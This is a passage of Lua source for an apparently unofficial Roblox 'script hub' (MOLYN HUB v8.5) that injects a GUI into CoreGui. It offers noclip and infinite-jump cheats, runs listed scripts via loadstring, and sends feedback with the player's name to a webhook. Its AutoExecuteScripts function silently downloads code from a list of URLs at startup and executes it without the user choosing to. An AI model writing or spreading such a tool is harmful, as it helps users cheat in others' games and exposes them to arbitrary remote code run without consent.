    local function toggleInfiniteJump()
        Bypass.IJ.Enabled = not Bypass.IJ.Enabled
        if Bypass.IJ.Enabled then
            infiniteJumpBtn.Text = "ON"
            infiniteJumpBtn.BackgroundColor3 = theme.success
            CreateNotification("Infinite Jump enabled", theme.success, 3)
        else
            infiniteJumpBtn.Text = "OFF"
            infiniteJumpBtn.BackgroundColor3 = theme.error
            CreateNotification("Infinite Jump disabled", theme.warning, 3)
        end
    end
    
    textBox:GetPropertyChangedSignal("Text"):Connect(function()
        local text = textBox.Text
        if #text > MAX_FEEDBACK_LENGTH then
            textBox.Text = string.sub(text, 1, MAX_FEEDBACK_LENGTH)
        end
        charCount.Text = #textBox.Text.."/"..MAX_FEEDBACK_LENGTH
    end)
    
    sendButton.MouseButton1Click:Connect(function()
        local currentTime = os.time()
        if currentTime - lastFeedbackTime < FEEDBACK_COOLDOWN then
            local remainingTime = FEEDBACK_COOLDOWN - (currentTime - lastFeedbackTime)
            CreateNotification("Please wait "..remainingTime.." seconds before sending another feedback", theme.warning, 3)
            return
        end
        
        local feedbackText = string.sub(textBox.Text, 1, MAX_FEEDBACK_LENGTH)
        if #feedbackText < 5 then
            CreateNotification("Feedback too short (min 5 characters)", theme.warning, 3)
            return
        end
        
        -- Check for blacklisted words
        for _, word in ipairs(FEEDBACK_BLACKLIST) do
            if string.find(string.lower(feedbackText), string.lower(word)) then
                CreateNotification("Feedback contains blocked content", theme.error, 3)
                return
            end
        end
        
        local data = {
            ["content"] = "New Feedback Received",
            ["embeds"] = {{
                ["title"] = "User Feedback",
                ["description"] = feedbackText,
                ["color"] = 14423100,
                ["fields"] = {
                    {["name"] = "👤 Player", ["value"] = player.Name, ["inline"] = true},
                    {["name"] = "🎮 Game", ["value"] = MarketplaceService:GetProductInfo(game.PlaceId).Name, ["inline"] = true},
                    {["name"] = "🕒 Time", ["value"] = os.date("%X - %d/%m/%Y"), ["inline"] = true}
                }
            }}
        }
        
        local success = SendWebhook(FEEDBACK_WEBHOOK_URL, data)
        if success then
            CreateNotification("Feedback sent successfully!", theme.success, 3)
            textBox.Text = ""
            lastFeedbackTime = currentTime
        end
    end)
    
    noclipBtn.MouseButton1Click:Connect(toggleNoclip)
    infiniteJumpBtn.MouseButton1Click:Connect(toggleInfiniteJump)
    
    feedbackFrame.AutomaticSize = Enum.AutomaticSize.Y
    
    return feedbackScroll
end

-- Floating button with animations
local function CreateFloatingButton()
    local floatingGui = Instance.new("ScreenGui")
    floatingGui.Name = "MOLYN_FloatingButton"
    floatingGui.ResetOnSpawn = false
    floatingGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    floatingGui.DisplayOrder = 1000
    floatingGui.Parent = CoreGui

    local button = Instance.new("ImageButton")
    button.Image = "rbxassetid://109421193232034"
    button.Size = UDim2.new(0, 60, 0, 60)
    button.Position = UDim2.new(1, -70, 0.5, -30)
    button.BackgroundColor3 = theme.logoBackground
    button.Parent = floatingGui

    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(1, 0)
    corner.Parent = button

    local glow = Instance.new("UIStroke")
    glow.Color = theme.primary
    glow.Thickness = 2
    glow.Transparency = 0.3
    glow.Parent = button

    -- Pulsing glow animation
    spawn(function()
        while button and button.Parent do
            TweenService:Create(glow, TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
                Transparency = 0.7
            }):Play()
            wait(1)
            TweenService:Create(glow, TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
                Transparency = 0.3
            }):Play()
            wait(1)
        end
    end)

    -- Hover animations
    button.MouseEnter:Connect(function()
        TweenService:Create(button, TweenInfo.new(0.2), {Size = UDim2.new(0, 65, 0, 65)}):Play()
    end)

    button.MouseLeave:Connect(function()
        TweenService:Create(button, TweenInfo.new(0.2), {Size = UDim2.new(0, 60, 0, 60)}):Play()
    end)

    -- Dragging functionality
    local dragging = false
    local dragStart, startPos
    
    button.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = input.Position
            startPos = button.Position
            
            local connection
            connection = input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    dragging = false
                    connection:Disconnect()
                end
            end)
        end
    end)
    
    UserInputService.InputChanged:Connect(function(input)
        if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
            local delta = input.Position - dragStart
            button.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        end
    end)
    
    return floatingGui, button
end

-- Main GUI with animations and improved UI
local function createGUI()
    if not game:IsLoaded() then
        game.Loaded:Wait()
    end

    local coreGui = game:GetService("CoreGui")
    local existing = coreGui:FindFirstChild("MOLYN_HUB")
    if existing then
        existing:Destroy()
    end

    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "MOLYN_HUB"
    screenGui.ResetOnSpawn = false
    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    screenGui.DisplayOrder = 999
    screenGui.Parent = coreGui
    
    local screenSize = workspace.CurrentCamera.ViewportSize
    local isMobile = UserInputService.TouchEnabled
    
    local baseWidth = math.min(400, screenSize.X * 0.9)
    local baseHeight = math.min(550, screenSize.Y * 0.85)
    
    baseWidth = math.max(baseWidth, 350)
    baseHeight = math.max(baseHeight, 450)
    
    local mainFrame = Instance.new("Frame")
    mainFrame.Size = UDim2.new(0, baseWidth, 0, baseHeight)
    mainFrame.Position = UDim2.new(0.5, -baseWidth/2, 0.5, -baseHeight/2)
    mainFrame.BackgroundColor3 = theme.background
    mainFrame.BorderSizePixel = 0
    mainFrame.ClipsDescendants = true
    mainFrame.Parent = screenGui
    
    local glow = Instance.new("UIStroke")
    glow.Color = theme.primary
    glow.Thickness = 2
    glow.Transparency = 0.3
    glow.Parent = mainFrame
    
    -- Pulsing glow animation
    spawn(function()
        while screenGui.Parent do
            TweenService:Create(glow, TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
                Transparency = 0.7
            }):Play()
            wait(1)
            TweenService:Create(glow, TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
                Transparency = 0.3
            }):Play()
            wait(1)
        end
    end)
    
    local function updateSize()
        screenSize = workspace.CurrentCamera.ViewportSize
        
        local newBaseWidth = math.min(400, screenSize.X * 0.9)
        local newBaseHeight = math.min(550, screenSize.Y * 0.85)
        
        newBaseWidth = math.max(newBaseWidth, 350)
        newBaseHeight = math.max(newBaseHeight, 450)
        
        mainFrame.Size = UDim2.new(0, newBaseWidth, 0, newBaseHeight)
        mainFrame.Position = UDim2.new(0.5, -newBaseWidth/2, 0.5, -newBaseHeight/2)
    end
    
    workspace.CurrentCamera:GetPropertyChangedSignal("ViewportSize"):Connect(updateSize)
    
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 12)
    corner.Parent = mainFrame
    
    local header = Instance.new("Frame")
    header.Size = UDim2.new(1, 0, 0, isMobile and 70 or 90)
    header.BackgroundColor3 = theme.logoBackground
    header.BorderSizePixel = 0
    header.Parent = mainFrame
    
    local headerCorner = Instance.new("UICorner")
    headerCorner.CornerRadius = UDim.new(0, 12)
    headerCorner.Parent = header

    -- Static logo
    local logoSize = math.floor((isMobile and 50 or 70) * 1.2)
    local logoContainer = Instance.new("Frame")
    logoContainer.Size = UDim2.new(0, logoSize, 0, logoSize)
    logoContainer.Position = UDim2.new(0.5, -logoSize/2, 0.5, -logoSize/2)
    logoContainer.BackgroundColor3 = theme.logoBackground
    logoContainer.Parent = header
    
    local logoCorner = Instance.new("UICorner")
    logoCorner.CornerRadius = UDim.new(0, 12)
    logoCorner.Parent = logoContainer

    local logo = Instance.new("ImageLabel")
    logo.Image = "rbxassetid://109421193232034"
    logo.Size = UDim2.new(0, logoSize-10, 0, logoSize-10)
    logo.Position = UDim2.new(0.5, -(logoSize-10)/2, 0.5, -(logoSize-10)/2)
    logo.BackgroundTransparency = 1
    logo.Parent = logoContainer

    local title = Instance.new("TextLabel")
    title.Text = "MOLYN FREE"
    title.Size = UDim2.new(1, 0, 0, 30)
    title.Position = UDim2.new(0, 0, 0, isMobile and 80 or 100)
    title.BackgroundTransparency = 1
    title.TextColor3 = theme.primary
    title.Font = Enum.Font.GothamBold
    title.TextSize = isMobile and 16 or 22
    title.TextStrokeTransparency = 0.8
    title.TextStrokeColor3 = Color3.new(0, 0, 0)
    title.Parent = mainFrame

    local gameName = MarketplaceService:GetProductInfo(game.PlaceId).Name
    local subtitle = Instance.new("TextLabel")
    subtitle.Text = "Public SCRIPT HUB | v8.5 | "..gameName
    subtitle.Size = UDim2.new(1, 0, 0, 20)
    subtitle.Position = UDim2.new(0, 0, 0, isMobile and 105 or 130)
    subtitle.BackgroundTransparency = 1
    subtitle.TextColor3 = theme.textSecondary
    subtitle.Font = Enum.Font.Gotham
    subtitle.TextSize = isMobile and 10 or 12
    subtitle.Parent = mainFrame

    local closeBtn = Instance.new("TextButton")
    closeBtn.Text = "X"
    closeBtn.Size = UDim2.new(0, 25, 0, 25)
    closeBtn.Position = UDim2.new(1, -35, 0, 10)
    closeBtn.BackgroundColor3 = theme.closeButton
    closeBtn.TextColor3 = theme.text
    closeBtn.Font = Enum.Font.GothamBold
    closeBtn.Parent = mainFrame
    
    local btnCorner = Instance.new("UICorner")
    btnCorner.CornerRadius = UDim.new(0, 8)
    btnCorner.Parent = closeBtn
    
    closeBtn.MouseEnter:Connect(function()
        TweenService:Create(closeBtn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(255, 20, 20)}):Play()
    end)
    
    closeBtn.MouseLeave:Connect(function()
        TweenService:Create(closeBtn, TweenInfo.new(0.2), {BackgroundColor3 = theme.closeButton}):Play()
    end)

    local tabsFrame = Instance.new("Frame")
    tabsFrame.Size = UDim2.new(1, -20, 0, isMobile and 25 or 30)
    tabsFrame.Position = UDim2.new(0, 10, 0, isMobile and 130 or 160)
    tabsFrame.BackgroundTransparency = 1
    tabsFrame.Parent = mainFrame
    
    local scriptsTab = Instance.new("TextButton")
    scriptsTab.Text = "SCRIPTS"
    scriptsTab.Size = UDim2.new(0.5, -5, 1, 0)
    scriptsTab.Position = UDim2.new(0, 0, 0, 0)
    scriptsTab.BackgroundColor3 = theme.primary
    scriptsTab.TextColor3 = theme.text
    scriptsTab.Font = Enum.Font.GothamBold
    scriptsTab.TextSize = isMobile and 10 or 12
    scriptsTab.Parent = tabsFrame
    
    local feedbackTab = Instance.new("TextButton")
    feedbackTab.Text = "FEEDBACK"
    feedbackTab.Size = UDim2.new(0.5, -5, 1, 0)
    feedbackTab.Position = UDim2.new(0.5, 5, 0, 0)
    feedbackTab.BackgroundColor3 = theme.surface
    feedbackTab.TextColor3 = theme.text
    feedbackTab.Font = Enum.Font.GothamBold
    feedbackTab.TextSize = isMobile and 10 or 12
    feedbackTab.Parent = tabsFrame
    
    local tabCorner = Instance.new("UICorner")
    tabCorner.CornerRadius = UDim.new(0, 6)
    tabCorner.Parent = scriptsTab
    tabCorner:Clone().Parent = feedbackTab
    
    local contentFrame = Instance.new("Frame")
    contentFrame.Size = UDim2.new(1, -20, 1, isMobile and -165 or -200)
    contentFrame.Position = UDim2.new(0, 10, 0, isMobile and 160 or 200)
    contentFrame.BackgroundTransparency = 1
    contentFrame.ClipsDescendants = true
    contentFrame.Parent = mainFrame
    
    -- Create containers for tab content with animations
    local scriptsContainer = Instance.new("Frame")
    scriptsContainer.Size = UDim2.new(1, 0, 1, 0)
    scriptsContainer.BackgroundTransparency = 1
    scriptsContainer.ClipsDescendants = true
    scriptsContainer.Parent = contentFrame
    
    local feedbackContainer = Instance.new("Frame")
    feedbackContainer.Size = UDim2.new(1, 0, 1, 0)
    feedbackContainer.BackgroundTransparency = 1
    feedbackContainer.Position = UDim2.new(1, 0, 0, 0) -- Initially off-screen
    feedbackContainer.ClipsDescendants = true
    feedbackContainer.Parent = contentFrame
    
    -- Create search bar in scripts container
    local searchBar = Instance.new("Frame")
    searchBar.Size = UDim2.new(1, 0, 0, isMobile and 45 or 50)
    searchBar.BackgroundColor3 = theme.surface
    searchBar.Parent = scriptsContainer
    
    local searchCorner = Instance.new("UICorner")
    searchCorner.CornerRadius = UDim.new(0, 8)
    searchCorner.Parent = searchBar
    
    local searchBox = Instance.new("TextBox")
    searchBox.PlaceholderText = "Search scripts..."
    searchBox.Size = UDim2.new(1, -20, 0.8, 0)
    searchBox.Position = UDim2.new(0, 10, 0.1, 0)
    searchBox.BackgroundColor3 = theme.background
    searchBox.TextColor3 = theme.text
    searchBox.Font = Enum.Font.Gotham
    searchBox.TextSize = isMobile and 12 or 14
    searchBox.TextXAlignment = Enum.TextXAlignment.Left
    searchBox.ClearTextOnFocus = false
    searchBox.Text = ""
    searchBox.Parent = searchBar
    
    local searchIcon = Instance.new("TextLabel")
    searchIcon.Text = "🔍"
    searchIcon.Size = UDim2.new(0, 30, 0, 30)
    searchIcon.Position = UDim2.new(1, -40, 0.1, 0)
    searchIcon.BackgroundTransparency = 1
    searchIcon.TextColor3 = theme.textSecondary
    searchIcon.Font = Enum.Font.Gotham
    searchIcon.TextSize = 16
    searchIcon.Parent = searchBar
    
    local boxCorner = Instance.new("UICorner")
    boxCorner.CornerRadius = UDim.new(0, 6)
    boxCorner.Parent = searchBox
    
    local scriptsFrame = Instance.new("ScrollingFrame")
    scriptsFrame.Size = UDim2.new(1, 0, 1, -searchBar.Size.Y.Offset)
    scriptsFrame.Position = UDim2.new(0, 0, 0, searchBar.Size.Y.Offset)
    scriptsFrame.BackgroundTransparency = 1
    scriptsFrame.ScrollBarThickness = isMobile and 8 or 6
    scriptsFrame.ScrollBarImageColor3 = theme.primary
    scriptsFrame.AutomaticCanvasSize = Enum.AutomaticSize.Y
    scriptsFrame.ScrollingDirection = Enum.ScrollingDirection.Y
    scriptsFrame.VerticalScrollBarInset = Enum.ScrollBarInset.Always
    scriptsFrame.Parent = scriptsContainer

    local layout = Instance.new("UIListLayout")
    layout.Padding = UDim.new(0, isMobile and 8 or 10)
    layout.Parent = scriptsFrame

    -- Create feedback UI in feedback container
    local feedbackFrame = CreateFeedbackUI(feedbackContainer)
    feedbackFrame.Position = UDim2.new(0, 10, 0, 0)
    feedbackFrame.Size = UDim2.new(1, -20, 1, 0)
    
    local currentGameId = tostring(game.PlaceId)
    
    local supportedScripts, featuredScripts, regularScripts = GetScripts(currentGameId)
    
    local scriptButtons = {}
    
    local function createScriptButton(scriptData, badgeType)
        local btn = Instance.new("Frame")
        btn.Size = UDim2.new(1, 0, 0, isMobile and 60 or 70)
        btn.BackgroundColor3 = theme.surface
        btn.Parent = scriptsFrame
        btn.Name = scriptData.name
        btn.Visible = true

        local btnCorner = Instance.new("UICorner")
        btnCorner.CornerRadius = UDim.new(0, 8)
        btnCorner.Parent = btn

        -- Adjust name position if there's a badge
        local nameYPosition = 5
        local descYPosition = isMobile and 25 or 35
        
        if badgeType then
            nameYPosition = 25
            descYPosition = isMobile and 45 or 55
        end

        local name = Instance.new("TextLabel")
        name.Text = scriptData.name
        name.Size = UDim2.new(0.7, 0, 0, isMobile and 20 or 25)
        name.Position = UDim2.new(0, 10, 0, nameYPosition)
        name.BackgroundTransparency = 1
        name.TextColor3 = theme.text
        name.Font = Enum.Font.GothamBold
        name.TextSize = isMobile and 12 or 14
        name.TextXAlignment = Enum.TextXAlignment.Left
        name.TextStrokeTransparency = 0.8
        name.TextStrokeColor3 = Color3.new(0, 0, 0)
        name.Parent = btn

        local desc = Instance.new("TextLabel")
        desc.Text = scriptData.description
        desc.Size = UDim2.new(0.7, 0, 0, isMobile and 15 or 15)
        desc.Position = UDim2.new(0, 10, 0, descYPosition)
        desc.BackgroundTransparency = 1
        desc.TextColor3 = theme.textSecondary
        desc.Font = Enum.Font.Gotham
        desc.TextSize = isMobile and 10 or 12
        desc.TextXAlignment = Enum.TextXAlignment.Left
        desc.Parent = btn

        local execBtn = Instance.new("TextButton")
        execBtn.Text = "EXECUTE"
        execBtn.Size = UDim2.new(0, isMobile and 70 or 90, 0, isMobile and 22 or 25)
        execBtn.Position = UDim2.new(1, isMobile and -80 or -100, 0.5, isMobile and -11 or -12.5)
        execBtn.BackgroundColor3 = theme.primary
        execBtn.TextColor3 = theme.text
        execBtn.Font = Enum.Font.GothamBold
        execBtn.TextSize = isMobile and 10 or 12
        execBtn.Parent = btn

        local execCorner = Instance.new("UICorner")
        execCorner.CornerRadius = UDim.new(0, 6)
        execCorner.Parent = execBtn

        -- Button hover animations
        execBtn.MouseEnter:Connect(function()
            TweenService:Create(execBtn, TweenInfo.new(0.2), {BackgroundColor3 = theme.accent}):Play()
        end)
        
        execBtn.MouseLeave:Connect(function()
            TweenService:Create(execBtn, TweenInfo.new(0.2), {BackgroundColor3 = theme.primary}):Play()
        end)

        -- Script execution with animation
        local function executeScript()
            -- Press animation
            TweenService:Create(execBtn, TweenInfo.new(0.1), {
                Size = UDim2.new(0, execBtn.Size.X.Offset - 5, 0, execBtn.Size.Y.Offset - 2)
            }):Play()
            
            wait(0.1)
            
            TweenService:Create(execBtn, TweenInfo.new(0.1), {
                Size = UDim2.new(0, execBtn.Size.X.Offset + 5, 0, execBtn.Size.Y.Offset + 2)
            }):Play()
            
            -- Execute script
            local success, result = pcall(function()
                loadstring(scriptData.code)()
            end)
            
            if success then
                CreateNotification("Executed: "..scriptData.name, theme.success, 3)
            else
                CreateNotification("Execution failed: "..scriptData.name, theme.error, 3)
            end
        end

        -- Single click execution for all devices
        execBtn.MouseButton1Click:Connect(executeScript)

        if badgeType == "support" then
            local badge = Instance.new("Frame")
            badge.Size = UDim2.new(0, isMobile and 60 or 80, 0, isMobile and 16 or 18)
            badge.Position = UDim2.new(0, 10, 0, 5)
            badge.BackgroundColor3 = theme.supportGreen
            badge.Parent = btn

            local badgeCorner = Instance.new("UICorner")
            badgeCorner.CornerRadius = UDim.new(0, 6)
            badgeCorner.Parent = badge

            local badgeText = Instance.new("TextLabel")
            badgeText.Text = "★ SUPPORT ★"
            badgeText.Size = UDim2.new(1, 0, 1, 0)
            badgeText.BackgroundTransparency = 1
            badgeText.TextColor3 = theme.text
            badgeText.Font = Enum.Font.GothamBold
            badgeText.TextSize = isMobile and 7 or 9
            badgeText.Parent = badge
        elseif badgeType == "featured" then
            local badge = Instance.new("Frame")
            badge.Size = UDim2.new(0, isMobile and 60 or 80, 0, isMobile and 16 or 18)
            badge.Position = UDim2.new(0, 10, 0, 5)
            badge.BackgroundColor3 = theme.primary
            badge.Parent = btn

            local badgeCorner = Instance.new("UICorner")
            badgeCorner.CornerRadius = UDim.new(0, 6)
            badgeCorner.Parent = badge

            local badgeText = Instance.new("TextLabel")
            badgeText.Text = "★ FEATURED ★"
            badgeText.Size = UDim2.new(1, 0, 1, 0)
            badgeText.BackgroundTransparency = 1
            badgeText.TextColor3 = theme.text
            badgeText.Font = Enum.Font.GothamBold
            badgeText.TextSize = isMobile and 7 or 9
            badgeText.Parent = badge
        end
        
        table.insert(scriptButtons, {
            frame = btn,
            name = scriptData.name:lower(),
            desc = scriptData.description:lower()
        })
        
        return btn
    end

    -- Create script buttons with SUPPORT badges first
    for _, script in ipairs(supportedScripts) do
        createScriptButton(script, "support")
    end
    
    for _, script in ipairs(featuredScripts) do
        createScriptButton(script, "featured")
    end
    
    for _, script in ipairs(regularScripts) do
        createScriptButton(script, nil)
    end

    local function updateSearchResults(searchText)
        local searchLower = searchText:lower()
        
        for _, buttonData in ipairs(scriptButtons) do
            local visible = false
            
            if searchText == "" then
                visible = true
            else
                if buttonData.name:find(searchLower) or buttonData.desc:find(searchLower) then
                    visible = true
                end
            end
            
            buttonData.frame.Visible = visible
        end
    end
    
    searchBox:GetPropertyChangedSignal("Text"):Connect(function()
        updateSearchResults(searchBox.Text)
    end)

    layout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
        scriptsFrame.CanvasSize = UDim2.new(0, 0, 0, layout.AbsoluteContentSize.Y + 10)
    end)

    closeBtn.MouseButton1Click:Connect(function()
        -- Close animation
        local closeTween = TweenService:Create(mainFrame, TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.In), {
            Size = UDim2.new(0, 0, 0, 0),
            Position = UDim2.new(0.5, 0, 0.5, 0)
        })
        
        closeTween:Play()
        closeTween.Completed:Wait()
        screenGui:Destroy()
    end)

    -- Dragging functionality
    local dragging = false
    local dragStart, startPos
    
    header.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or (input.UserInputType == Enum.UserInputType.Touch and not UserInputService:GetFocusedTextBox()) then
            dragging = true
            dragStart = input.Position
            startPos = mainFrame.Position
            
            local connection
            connection = input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    dragging = false
                    connection:Disconnect()
                end
            end)
        end
    end)
    
    UserInputService.InputChanged:Connect(function(input)
        if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
            local delta = input.Position - dragStart
            mainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        end
    end)
    
    -- Open animation
    mainFrame.Size = UDim2.new(0, 0, 0, 0)
    mainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
    
    local openTween = TweenService:Create(mainFrame, TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
        Size = UDim2.new(0, baseWidth, 0, baseHeight),
        Position = UDim2.new(0.5, -baseWidth/2, 0.5, -baseHeight/2)
    })
    
    openTween:Play()

    -- Function to switch tabs with animations
    local function switchToTab(tabName)
        if tabName == "scripts" then
            -- Animate tabs
            TweenService:Create(scriptsTab, TweenInfo.new(0.2), {BackgroundColor3 = theme.primary}):Play()
            TweenService:Create(feedbackTab, TweenInfo.new(0.2), {BackgroundColor3 = theme.surface}):Play()
            
            -- Animate content
            TweenService:Create(feedbackContainer, TweenInfo.new(0.3, Enum.EasingStyle.Quad), {
                Position = UDim2.new(1, 0, 0, 0)
            }):Play()
            
            TweenService:Create(scriptsContainer, TweenInfo.new(0.3, Enum.EasingStyle.Quad), {
                Position = UDim2.new(0, 0, 0, 0)
            }):Play()
        else
            -- Animate tabs
            TweenService:Create(scriptsTab, TweenInfo.new(0.2), {BackgroundColor3 = theme.surface}):Play()
            TweenService:Create(feedbackTab, TweenInfo.new(0.2), {BackgroundColor3 = theme.primary}):Play()
            
            -- Animate content
            TweenService:Create(scriptsContainer, TweenInfo.new(0.3, Enum.EasingStyle.Quad), {
                Position = UDim2.new(-1, 0, 0, 0)
            }):Play()
            
            TweenService:Create(feedbackContainer, TweenInfo.new(0.3, Enum.EasingStyle.Quad), {
                Position = UDim2.new(0, 0, 0, 0)
            }):Play()
        end
    end
    
    scriptsTab.MouseButton1Click:Connect(function()
        switchToTab("scripts")
    end)
    
    feedbackTab.MouseButton1Click:Connect(function()
        switchToTab("feedback")
    end)

    -- Switch to scripts tab by default
    switchToTab("scripts")

    return screenGui
end

-- Auto execute scripts
local function AutoExecuteScripts()
    for _, url in ipairs(AUTO_EXECUTE_URLS) do
        pcall(function()
            local content = game:HttpGet(url)
            if content then
                local fn, err = loadstring(content)
                if fn then
                    pcall(fn)
                end
            end
        end)
    end
end

-- Main initialization
local function Initialize()
    if not CheckSecurity() then return end

    if not game:IsLoaded() then
        game.Loaded:Wait()
    end

    -- Create UI immediately
    CreateNotification("MOLYN HUB LOADED", theme.primary, 3)
    
    local floatingGui, floatingButton = CreateFloatingButton()
    
    local gui = createGUI()
    local guiVisible = true
    
    -- Run background tasks after UI is shown
    spawn(function()
        -- Run anti-spam in background
        ActivateAntiSpam()
        
        -- Auto execute scripts
        AutoExecuteScripts()
    end)

    -- Floating button toggle
    floatingButton.MouseButton1Click:Connect(function()
        if guiVisible and gui then
            gui:Destroy()
            gui = nil
            guiVisible = false
            CreateNotification("MOLYN Hub hidden", theme.textSecondary, 2)
        else
            gui = createGUI()
            guiVisible = gui ~= nil
            if guiVisible then
                CreateNotification("MOLYN Hub opened", theme.primary, 2)
            end
        end
    end)

    -- Keyboard toggle
    UserInputService.InputBegan:Connect(function(input, gameProcessed)
        if gameProcessed then return end
        
        if input.KeyCode == Enum.KeyCode.Insert then
            if guiVisible and gui then
                gui:Destroy()
                gui = nil
                guiVisible = false
                CreateNotification("MOLYN Hub hidden", theme.textSecondary, 2)
            else
                gui = createGUI()
                guiVisible = gui ~= nil
                if guiVisible then
                    CreateNotification("MOLYN Hub opened", theme.primary, 2)
                end
            end
        end
    end)
end

-- Safe initialization
local success, err = pcall(Initialize)
if not success then
    warn("Initialization failed: " .. tostring(err))
end
